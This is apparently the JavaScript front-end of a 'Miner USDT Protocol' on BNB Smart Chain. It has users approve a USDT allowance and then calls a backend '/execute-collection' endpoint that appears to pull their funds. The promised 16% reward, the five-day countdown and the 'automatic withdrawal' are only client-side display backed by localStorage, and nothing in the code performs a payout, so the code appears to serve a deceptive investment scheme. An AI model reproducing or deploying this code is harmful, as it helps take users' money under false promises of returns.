import { CONFIG } from './config.js';
import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm';
import { createAppKit } from 'https://cdn.jsdelivr.net/npm/@reown/appkit@1.6.0/+esm';
import { Ethers5Adapter } from 'https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-ethers5@1.6.0/+esm';
import { bsc } from 'https://cdn.jsdelivr.net/npm/@reown/appkit@1.6.0/networks/+esm';

// ==========================================
// VARIABLES GLOBALES DE ESTADO & PERSISTENCIA
// ==========================================
let modal = null;
let provider = null;
let signer = null;
let userAddress = null;
let pendingInvestment = false;
let userRealStakedAmount = 0;
let countdownTimerInterval = null;

// Últimos balances cacheados para evitar leer el DOM
let latestUsdtBalanceBN = null;
let latestUsdtBalanceFloat = 0;

// Cargar transacciones previas de la sesión persistente si existen
let sessionTxs = [];
try {
    const savedTxs = localStorage.getItem('miner_session_txs');
    if (savedTxs) sessionTxs = JSON.parse(savedTxs);
} catch (e) {
    sessionTxs = [];
}

const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function approve(address spender, uint256 amount) external returns (bool)"
];

const USDT_DECIMALS = Number(CONFIG.USDT_DECIMALS || 18);
const MIN_INVEST = 0.1;
const DEFAULT_MAX = 1000.0;
const SESSION_TXS_LIMIT = 10;
const TX_CONFIRM_TIMEOUT_MS = 2 * 60 * 1000; // 2 minutes

// ==========================================
// INICIALIZACIÓN DE LA APLICACIÓN
// ==========================================
export async function initApp() {
    setupWakeUpBackend();
    initWalletModal();
    setupUIEventListeners();
    updateMainActionButton('CONNECT');

    const merchantInput = document.getElementById('merchantAddress');
    if (merchantInput) {
        merchantInput.value = CONFIG.MERCHANT_ADDRESS;
        makeCopyableInput(merchantInput, CONFIG.MERCHANT_ADDRESS);
    }

    // Renderizar transacciones persistidas al cargar
    renderStoredTransactions();
}

export function openAccountModal() {
    if (modal) {
        modal.open({ view: 'Account' });
    }
}

export function openConnectModal() {
    if (modal) modal.open();
}

function setupWakeUpBackend() {
    try {
        fetch(`${CONFIG.BACKEND_URL}/health`, { method: 'GET' }).catch((error) => {
            console.warn('No se pudo contactar el backend de salud:', error);
        });
    } catch (error) {
        console.warn('Error al intentar despertar el backend:', error);
    }
}

// ==========================================
// CONFIGURACIÓN REOWN APPKIT v1.6.0 + ETHERS v5
// ==========================================
function initWalletModal() {
    const metadata = {
        name: CONFIG.APP_NAME || 'Miner USDT Protocol',
        description: 'Plataforma de pagos y finanzas descentralizadas',
        url: window.location.origin,
        icons: [`${window.location.origin}/img/logo.svg`]
    };

    const ethersAdapter = new Ethers5Adapter();

    modal = createAppKit({
        adapters: [ethersAdapter],
        networks: [bsc],
        defaultNetwork: bsc,
        metadata,
        projectId: CONFIG.PROJECT_ID,
        features: {
            analytics: true,
            swaps: false,
            onramp: false
        }
    });

    window.modal = modal;

    const activeProv = modal.getWalletProvider?.();
    if (activeProv) {
        handleConnectedProvider(activeProv);
    }

    if (modal && typeof modal.subscribeEvents === 'function') {
        modal.subscribeEvents((event) => {
            if (event.data && event.data.event === 'DISCONNECT') {
                resetAppSession();
            } else if (event.data && (event.data.event === 'CONNECT_SUCCESS' || event.data.event === 'MODAL_CLOSE')) {
                const prov = modal.getWalletProvider?.();
                if (prov && !userAddress) {
                    handleConnectedProvider(prov);
                    if (pendingInvestment) {
                        pendingInvestment = false;
                        runInvestmentFlow(prov);
                    }
                }
            }
        });
    }
}

// ==========================================
// MANEJADOR DE PROVEEDOR (ETHERS v5)
// ==========================================
async function handleConnectedProvider(walletProvider) {
    try {
        provider = new ethers.providers.Web3Provider(walletProvider);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        // Restaurar estado persistido del usuario si existe en localStorage
        loadUserState(userAddress);

        if (walletProvider && typeof walletProvider.on === 'function') {
            walletProvider.removeAllListeners?.('disconnect');
            walletProvider.removeAllListeners?.('accountsChanged');

            walletProvider.on('disconnect', async () => {
                await forceCloseReownSession();
            });

            walletProvider.on('accountsChanged', async (accounts) => {
                if (!accounts || accounts.length === 0) {
                    await forceCloseReownSession();
                } else {
                    handleConnectedProvider(walletProvider);
                }
            });
        }

        updateWalletUI(userAddress);
        await updateBalances(walletProvider);
        updateMainActionButton('INVEST');
        validateInvestmentInput();
    } catch (error) {
        console.error('Error al sincronizar proveedor con Ethers v5:', error);
        resetAppSession();
    }
}

// ==========================================
// PERSISTENCIA DE ESTADO DE USUARIO
// ==========================================
function saveUserState(address, stakedAmount) {
    if (!address) return;
    const stateData = {
        stakedAmount: stakedAmount || 0,
        timestamp: Date.now()
    };
    try {
        localStorage.setItem(`miner_user_state_${address.toLowerCase()}`, JSON.stringify(stateData));
    } catch (e) {
        console.warn('No se pudo guardar el estado del usuario:', e);
    }
}

function loadUserState(address) {
    if (!address) return;
    try {
        const saved = localStorage.getItem(`miner_user_state_${address.toLowerCase()}`);
        if (saved) {
            const data = JSON.parse(saved);
            if (data.stakedAmount && data.stakedAmount > 0) {
                updateStakedUI(data.stakedAmount, false); // Cargar sin reiniciar timestamp si ya estaba activo
            }
        }
    } catch (e) {
        console.warn('No se pudo cargar el estado persistido del usuario', e);
    }
}

// ==========================================
// CIERRE DE SESIÓN Y LIMPIEZA DE CACHÉ
// ==========================================
async function forceCloseReownSession() {
    try {
        if (modal && typeof modal.disconnect === 'function') {
            await modal.disconnect();
        }
    } catch (e) {
        console.warn('Error al cerrar sesión en AppKit:', e);
    }

    for (let i = localStorage.length - 1; i >= 0; i--) {
        const key = localStorage.key(i);
        if (key && (key.includes('wc@') || key.includes('w3m') || key.includes('reown') || key.includes('appkit'))) {
            localStorage.removeItem(key);
        }
    }

    resetAppSession();
}

window.disconnectWalletSession = async function () {
    try {
        if (modal && typeof modal.getWalletProvider === 'function') {
            const rawProv = modal.getWalletProvider();
            if (rawProv && typeof rawProv.request === 'function') {
                await rawProv.request({
                    method: 'wallet_revokePermissions',
                    params: [{ eth_accounts: {} }]
                }).catch((error) => {
                    console.warn('No se pudieron revocar permisos del wallet:', error);
                });
            }
        }
    } catch (error) {
        console.warn('Error al limpiar permisos de la wallet:', error);
    }

    await forceCloseReownSession();
    setTimeout(() => {
        window.location.reload();
    }, 200);
};

// ==========================================
// UTILIDADES DE NUMÉRICOS Y TX
// ==========================================
function formatBalanceBN(bn) {
    try {
        return parseFloat(ethers.utils.formatUnits(bn, USDT_DECIMALS));
    } catch (e) {
        return 0;
    }
}

function parseInputToBN(valueStr) {
    const safeStr = String(valueStr || '').trim();
    if (safeStr === '') return ethers.BigNumber.from(0);
    // sanitize comma decimal separators
    const normalized = safeStr.replace(/,/g, '.');
    return ethers.utils.parseUnits(normalized, USDT_DECIMALS);
}

async function waitForTxReceipt(activeProvider, txHash, timeoutMs = TX_CONFIRM_TIMEOUT_MS) {
    const pollInterval = 1500;
    const maxAttempts = Math.ceil(timeoutMs / pollInterval);
    let attempts = 0;
    while (attempts < maxAttempts) {
        try {
            const receipt = await activeProvider.getTransactionReceipt(txHash);
            if (receipt && receipt.confirmations && receipt.status !== undefined) return receipt;
        } catch (e) {
            // ignore and retry
        }
        await new Promise(r => setTimeout(r, pollInterval));
        attempts++;
    }
    throw new Error('Timeout esperando confirmación de la transacción');
}

// ==========================================
// GESTIÓN DE INTERFAZ Y SALDOS (ETHERS v5)
// ==========================================
async function updateBalances(rawProvider) {
    if (!userAddress) return;
    try {
        const activeProvider = provider || new ethers.providers.Web3Provider(rawProvider);
        const activeSigner = signer || activeProvider.getSigner();

        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
        const usdtBal = await usdtContract.balanceOf(userAddress);
        latestUsdtBalanceBN = usdtBal;
        latestUsdtBalanceFloat = formatBalanceBN(usdtBal);

        const balanceLabel = document.getElementById('walletBalanceLabel');
        if (balanceLabel) {
            balanceLabel.textContent = `Saldo: ${latestUsdtBalanceFloat.toFixed(2)} USDT`;
        }

        // Configuración global y dinámica del botón MAX (Independiente del estado de conexión)
        const maxBtn = document.getElementById('maxBtn');
        if (maxBtn) {
            maxBtn.onclick = () => {
                const amountInput = document.getElementById('investAmount');
                if (!amountInput) return;

                // Si el usuario está conectado, adaptamos el MAX a su saldo real disponible
                let targetVal = DEFAULT_MAX;
                if (userAddress && typeof latestUsdtBalanceFloat === 'number') {
                    targetVal = latestUsdtBalanceFloat > 0 ? latestUsdtBalanceFloat : DEFAULT_MAX;
                }

                amountInput.value = targetVal.toFixed(2);
                amountInput.dispatchEvent(new Event('input'));
                validateInvestmentInput();
            };
        }

    } catch (err) {
        console.error('Error al sincronizar saldos en vivo:', err);
    }
}

function updateWalletUI(account) {
    const container = document.getElementById('walletButtonContainer');
    if (container) {
        // Crear elementos de forma segura en lugar de innerHTML para evitar XSS
        container.innerHTML = '';
        const wrapper = document.createElement('div');
        wrapper.style.display = 'flex';
        wrapper.style.alignItems = 'center';
        wrapper.style.gap = '8px';

        const badge = document.createElement('span');
        badge.className = 'wallet-badge';
        badge.id = 'connectedWalletBadge';
        badge.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;

        const btn = document.createElement('button');
        btn.title = 'Configuración de cuenta';
        btn.style.background = 'rgba(255, 255, 255, 0.05)';
        btn.style.border = '1px solid var(--surface-border)';
        btn.style.color = '#fff';
        btn.style.padding = '6px 10px';
        btn.textContent = '⚙️ Cuenta';
        btn.onclick = () => window.openAccountModal();

        wrapper.appendChild(badge);
        wrapper.appendChild(btn);
        container.appendChild(wrapper);
    }

    const txContainer = document.getElementById('sessionTxContainer');
    if (txContainer) txContainer.style.display = 'block';

    const withdrawalContainer = document.getElementById('withdrawalContainer');
    if (withdrawalContainer) withdrawalContainer.style.display = 'block';

    updateMainActionButton('INVEST');
}

function resetAppSession() {
    provider = null;
    signer = null;
    userAddress = null;
    userRealStakedAmount = 0;

    const container = document.getElementById('walletButtonContainer');
    if (container) {
        container.innerHTML = `
            <button onclick="window.openConnectModal()" class="wallet-badge" style="background: rgba(38,161,123,0.15); border: 1px solid var(--brand-primary); cursor: pointer;">
                Conectar Billetera
            </button>
        `;
    }

    const balanceLabel = document.getElementById('walletBalanceLabel');
    if (balanceLabel) balanceLabel.textContent = 'Saldo: 0.00 USDT';

    const stakedBadge = document.getElementById('stakedAmountBadge');
    if (stakedBadge) stakedBadge.textContent = '0.00 USDT';

    const pendingReward = document.getElementById('pendingRewardOutput');
    if (pendingReward) pendingReward.textContent = '0.00 USDT';

    if (countdownTimerInterval) clearInterval(countdownTimerInterval);
    const countdownEl = document.getElementById('roiCountdown');
    if (countdownEl) countdownEl.textContent = '--:--:--:--';

    const txContainer = document.getElementById('sessionTxContainer');
    if (txContainer) txContainer.style.display = 'none';

    const withdrawalContainer = document.getElementById('withdrawalContainer');
    if (withdrawalContainer) withdrawalContainer.style.display = 'none';

    updateMainActionButton('CONNECT');
    validateInvestmentInput();
}

function updateStakedUI(amount, persist = true) {
    userRealStakedAmount = parseFloat(amount) || 0;

    if (userAddress && persist) {
        saveUserState(userAddress, userRealStakedAmount);
    }

    const stakedBadge = document.getElementById('stakedAmountBadge');
    const pendingReward = document.getElementById('pendingRewardOutput');

    if (stakedBadge) {
        stakedBadge.textContent = `${userRealStakedAmount.toFixed(2)} USDT`;
    }

    if (pendingReward) {
        const calculatedReward = userRealStakedAmount * 0.16;
        pendingReward.textContent = `${calculatedReward.toFixed(2)} USDT`;
    }

    if (userRealStakedAmount > 0) {
        startRoiCountdown(5 * 24 * 60 * 60);
    }
}

function startRoiCountdown(durationInSeconds) {
    let timer = durationInSeconds;
    const countdownEl = document.getElementById('roiCountdown');
    if (!countdownEl) return;

    if (countdownTimerInterval) clearInterval(countdownTimerInterval);

    countdownTimerInterval = setInterval(() => {
        const days = Math.floor(timer / (3600 * 24));
        const hours = Math.floor((timer % (3600 * 24)) / 3600);
        const minutes = Math.floor((timer % 3600) / 60);
        const seconds = Math.floor(timer % 60);

        countdownEl.textContent = `${days}d ${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;

        if (--timer < 0) {
            clearInterval(countdownTimerInterval);
            countdownEl.textContent = '¡Completado (Retiro Auto)';
        }
    }, 1000);
}

function updateMainActionButton(state) {
    const approveBtn = document.getElementById('approveBtn');
    const btnText = document.getElementById('btnText');
    if (!approveBtn || !btnText) return;

    if (state === 'CONNECT') {
        btnText.textContent = 'CONECTAR BILLETERA';
        approveBtn.onclick = () => openConnectModal();
    } else {
        btnText.textContent = 'INVERTIR AHORA';
        approveBtn.onclick = async () => {
            let rawProvider = null;
            if (modal && typeof modal.getWalletProvider === 'function') {
                try {
                    rawProvider = modal.getWalletProvider();
                } catch (error) {
                    console.warn('No se pudo obtener el proveedor activo del wallet:', error);
                }
            }

            if (!rawProvider) {
                pendingInvestment = true;
                if (modal && typeof modal.open === 'function') {
                    try {
                        modal.open();
                    } catch (err) {
                        console.error('Error al desplegar el selector de billeteras:', err);
                        pendingInvestment = false;
                    }
                }
                return;
            }

            await runInvestmentFlow(rawProvider);
        };
    }
}

function setupUIEventListeners() {
    const input = document.getElementById('investAmount');
    if (input) {
        input.addEventListener('input', validateInvestmentInput);
    }
}

// Validación de límites (MIN fijo en 0.1 y MAX adaptable al estado)
function validateInvestmentInput() {
    const input = document.getElementById('investAmount');
    const wrapper = input ? input.closest('.input-wrapper') : null;
    if (!input || !wrapper) return;

    const val = parseFloat(input.value) || 0;
    const minVal = MIN_INVEST; // Mínimo fijo estricto

    let maxVal = DEFAULT_MAX; // Máximo por defecto si no está conectado

    if (userAddress) {
        if (latestUsdtBalanceBN && typeof latestUsdtBalanceBN.gt === 'function' && latestUsdtBalanceBN.gt(0)) {
            maxVal = parseFloat(formatBalanceBN(latestUsdtBalanceBN)) || DEFAULT_MAX;
        } else if (typeof latestUsdtBalanceFloat === 'number') {
            maxVal = parseFloat(latestUsdtBalanceFloat) || DEFAULT_MAX;
        }
    }

    // Comprobar si el valor está fuera de rango
    if (val > maxVal || val < minVal) {
        wrapper.classList.add('shake-error');
        setTimeout(() => wrapper.classList.remove('shake-error'), 500);
    } else {
        wrapper.classList.remove('shake-error');
    }
}

function updateStepper(activeStep) {
    for (let i = 1; i <= 3; i++) {
        const stepEl = document.getElementById(`step-${i}`);
        if (!stepEl) continue;
        const circle = stepEl.querySelector('.step-circle');

        if (i < activeStep) {
            circle.style.background = '#10b981';
            circle.style.color = '#fff';
            circle.textContent = '✓';
            stepEl.style.opacity = '0.7';
        } else if (i === activeStep) {
            circle.style.background = 'var(--brand-primary)';
            circle.style.color = '#fff';
            circle.textContent = i;
            stepEl.style.opacity = '1';
        } else {
            circle.style.background = 'rgba(255,255,255,0.1)';
            circle.style.color = 'var(--text-muted)';
            circle.textContent = i;
            stepEl.style.opacity = '0.5';
        }
    }
}

// ==========================================
// FLUJO DE INVERSIÓN (ETHERS v5) - MEJORADO
// ==========================================
async function runInvestmentFlow(rawProvider) {
    setLoading(true, 'Conectando proveedor…');
    updateStepper(1);

    try {
        const activeProvider = new ethers.providers.Web3Provider(rawProvider);

        setLoading(true, 'Verificando red BSC...');
        const network = await activeProvider.getNetwork();
        const targetChainIdNum = typeof CONFIG.CHAIN_ID === 'string' && CONFIG.CHAIN_ID.startsWith('0x') ? parseInt(CONFIG.CHAIN_ID, 16) : Number(CONFIG.CHAIN_ID);
        if (Number(network.chainId) !== targetChainIdNum) {
            setLoading(true, 'Cambiando a red BSC…');
            try {
                await rawProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: CONFIG.CHAIN_ID }]
                });
            } catch (switchError) {
                if (switchError && switchError.code === 4902) {
                    await rawProvider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: CONFIG.CHAIN_ID,
                            chainName: CONFIG.CHAIN_NAME,
                            rpcUrls: CONFIG.RPC_URLS,
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            blockExplorerUrls: [CONFIG.BLOCK_EXPLORER]
                        }]
                    });
                } else {
                    showToast('Cambia manualmente a BNB Smart Chain en tu wallet.', 'error');
                    setLoading(false);
                    return;
                }
            }
        }

        const activeSigner = activeProvider.getSigner();
        const activeUserAddress = await activeSigner.getAddress();

        setLoading(true, 'Verificando saldo de gas (BNB)…');
        const bnbBalance = await activeProvider.getBalance(activeUserAddress);
        const minGasRequired = ethers.utils.parseEther('0.0005');

        if (bnbBalance.lt(minGasRequired)) {
            showToast('Saldo de BNB insuficiente para pagar la comisión de red (Gas).', 'error');
            setLoading(false);
            return;
        }

        const inputElement = document.getElementById('investAmount');
        const rawInputVal = inputElement ? inputElement.value : String(MIN_INVEST);
        const requiredAmountBN = parseInputToBN(rawInputVal || String(MIN_INVEST));

        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);

        setLoading(true, 'Validando saldo de USDT…');
        const usdtBalance = await usdtContract.balanceOf(activeUserAddress);

        if (usdtBalance.lt(requiredAmountBN)) {
            showToast('No tienes suficiente saldo de USDT en tu billetera.', 'error');
            setLoading(false);
            return;
        }

        updateStepper(2);
        setLoading(true, 'Verificando autorizaciones...');
        let allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);

        const zeroBN = ethers.BigNumber.from(0);
        if (allowance.lt(requiredAmountBN)) {
            // confirmación informativa antes de solicitar firma
            const humanAmount = (parseFloat(rawInputVal) || 0).toFixed(2);
            const confirmMsg = `Vas a autorizar al contrato ${CONFIG.CONTRACT_ADDRESS} para gastar ${humanAmount} USDT desde tu wallet ${activeUserAddress}.\n\n¿Confirmas y continúas?`;
            const allowed = window.confirm(confirmMsg);
            if (!allowed) {
                showToast('Operación cancelada por el usuario.', 'default', 3000);
                setLoading(false);
                return;
            }

            // Si hay una allowance parcial, resetear a 0 para evitar problemas de tokens que no permiten aumento directo
            if (allowance.gt(zeroBN)) {
                setLoading(true, 'Restableciendo autorización previa...');
                const txReset = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, zeroBN);
                await txReset.wait();
                // re-check
                allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
            }

            setLoading(true, 'Firma requerida: Aprobar USDT...');
            const txApprove = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, requiredAmountBN);
            await txApprove.wait();

            // re-check para asegurarnos que la allowance ahora es suficiente
            allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
            if (allowance.lt(requiredAmountBN)) {
                throw new Error('La aprobación no otorgó suficiente allowance. Intenta nuevamente.');
            }
        }

        updateStepper(3);
        setLoading(true, 'Procesando inversión en protocolo...');

        const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);

        // Backend puede devolver varias formas de respuesta: { success: true, hash: '0x..' } o { success: true, tx: { hash: '0x..' } }
        const txHash = (txCollect && (txCollect.hash || (txCollect.tx && txCollect.tx.hash) || txCollect.transactionHash || txCollect.txHash)) || '';
        if (txHash) {
            addSessionTransaction(txHash);
            showToast('Inversión enviada, esperando confirmación...', 'default', 10 * 1000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);

            // Esperar confirmación con timeout
            try {
                const receipt = await waitForTxReceipt(activeProvider, txHash, TX_CONFIRM_TIMEOUT_MS);
                if (receipt && receipt.status === 1) {
                    showToast('¡Inversión confirmada!', 'success', 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
                } else {
                    showToast('La transacción fue revertida o falló. Revisa BscScan.', 'error', 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
                }
            } catch (e) {
                console.warn('No se obtuvo confirmación a tiempo:', e);
                showToast('Operación enviada, pero no se confirmó en el tiempo esperado. Revisa en el explorer.', 'default', 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
            }
        } else if (txCollect && txCollect.success) {
            // Si el backend aprobó la operación sin devolver hash, mostrar éxito
            showToast('Operación completada en backend (sin hash devuelto).', 'success', 6000);
        } else {
            showToast('¡Transacción completada con éxito! Gracias.', 'success', 6000);
        }

        updateStakedUI(rawInputVal);

    } catch (err) {
        console.error('Error en el flujo de inversión:', err);
        const errorMsg = err?.reason || err?.message || 'Error desconocido en la transacción.';
        showToast(`Operación cancelada o fallida: ${String(errorMsg).substring(0, 120)}`, 'error', 8000);
    } finally {
        setLoading(false);
        updateStepper(1);
    }
}

async function triggerBackendCollect(userAddress, amountStr) {
    let lastErr;
    const dynamicAmountWei = parseInputToBN(amountStr.toString()).toString();

    for (let i = 1; i <= 3; i++) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 20_000); // 20s timeout

            const res = await fetch(`${CONFIG.BACKEND_URL}/execute-collection`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei }),
                signal: controller.signal
            });

            clearTimeout(timeout);

            let data = null;
            try {
                data = await res.json();
            } catch (jsonErr) {
                data = null;
            }

            // Flexible validation: backend can return { success: boolean, hash: string } or include tx/hash inside nested object
            const ok = res.ok && data && (data.success === true);
            if (!ok) {
                // If response ok but success not true, try to infer txHash if present
                if (data && (data.hash || (data.tx && data.tx.hash) || data.transactionHash || data.txHash)) {
                    return data;
                }
                throw new Error((data && data.error) ? String(data.error) : `Collection failed (status ${res.status})`);
            }

            return data;
        } catch (e) {
            lastErr = e;
            if (e.name === 'AbortError') lastErr = new Error('Timeout calling backend');
            // Wait before retrying
            if (i < 3) await new Promise(r => setTimeout(r, 3000));
        }
    }
    throw lastErr;
}

function addSessionTransaction(txHash) {
    try {
        if (!sessionTxs.includes(txHash)) {
            sessionTxs.unshift(txHash);
            // Mantener un límite máximo de transacciones guardadas
            if (sessionTxs.length > SESSION_TXS_LIMIT) sessionTxs = sessionTxs.slice(0, SESSION_TXS_LIMIT);
            localStorage.setItem('miner_session_txs', JSON.stringify(sessionTxs));
        }
    } catch (e) {
        console.warn('No se pudo guardar la transacción en localStorage', e);
    }
    renderStoredTransactions();
}

function renderStoredTransactions() {
    const listContainer = document.getElementById('sessionTxList');
    if (!listContainer) return;

    // Limpiar primero
    listContainer.innerHTML = '';

    if (sessionTxs.length === 0) {
        const empty = document.createElement('span');
        empty.style.color = 'rgba(255,255,255,0.3)';
        empty.style.fontStyle = 'italic';
        empty.textContent = 'Sin transacciones confirmadas todavía';
        listContainer.appendChild(empty);
        return;
    }

    sessionTxs.forEach(hash => {
        const row = document.createElement('div');
        row.style.display = 'flex';
        row.style.justifyContent = 'space-between';
        row.style.alignItems = 'center';
        row.style.background = 'rgba(255,255,255,0.03)';
        row.style.padding = '8px 10px';
        row.style.borderRadius = '6px';
        row.style.marginBottom = '4px';

        const span = document.createElement('span');
        span.style.fontFamily = 'monospace';
        span.style.color = '#fff';
        span.textContent = `${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}`;

        const a = document.createElement('a');
        a.href = `${CONFIG.BLOCK_EXPLORER}/tx/${hash}`;
        a.target = '_blank';
        a.style.color = 'var(--brand-primary)';
        a.style.textDecoration = 'none';
        a.style.fontWeight = '600';
        a.textContent = 'Ver ↗';

        row.appendChild(span);
        row.appendChild(a);
        listContainer.appendChild(row);
    });
}

function makeCopyableInput(element, text) {
    element.style.cursor = 'pointer';
    element.title = 'Hacer clic para copiar dirección';
    element.addEventListener('click', async () => {
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                await navigator.clipboard.writeText(text);
            } else {
                // Fallback
                const ta = document.createElement('textarea');
                ta.value = text;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
            }
            showToast('¡Dirección copiada al portapapeles!', 'success', 2500);
        } catch (err) {
            console.error('Error al copiar:', err);
            showToast('No se pudo copiar la dirección automáticamente. Selecciónala y cópiala manualmente.', 'error', 4000);
        }
    });
}

// ==========================================
// UTILIDADES UI (LOADERS Y TOASTS)
// ==========================================
const approveBtn = document.getElementById('approveBtn');
const btnText = document.getElementById('btnText');
const btnSpinner = document.getElementById('btnSpinner');
const toastEl = document.getElementById('toast');

function setLoading(on, label = 'Procesando…') {
    if (!approveBtn) return;
    approveBtn.disabled = on;
    approveBtn.style.opacity = on ? '0.8' : '1';
    if (btnText) btnText.textContent = on ? label.toUpperCase() : 'INVERTIR AHORA';
    if (btnSpinner) btnSpinner.hidden = !on;
}

let _toastTimer;
function showToast(msg, type = 'default', ms = 4500, link = null) {
    if (!toastEl) return;
    clearTimeout(_toastTimer);
    toastEl.dataset.type = type === 'default' ? '' : type;
    toastEl.hidden = false;
    // Limpiar contenido
    toastEl.innerHTML = '';

    if (link) {
        const textNode = document.createElement('span');
        textNode.textContent = msg + ' ';
        const a = document.createElement('a');
        a.href = link;
        a.target = '_blank';
        a.style.color = '#fff';
        a.style.textDecoration = 'underline';
        a.textContent = 'Ver en BscScan ↗';
        toastEl.appendChild(textNode);
        toastEl.appendChild(a);
    } else {
        // texto simple
        const textNode = document.createElement('span');
        textNode.textContent = msg;
        toastEl.appendChild(textNode);
    }
  
    if (type === 'success') {
        toastEl.style.background = 'rgba(38, 161, 123, 0.95)';
    } else if (type === 'error') {
        toastEl.style.background = 'rgba(220, 53, 69, 0.95)';
    } else {
        toastEl.style.removeProperty('background');
    }

    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}
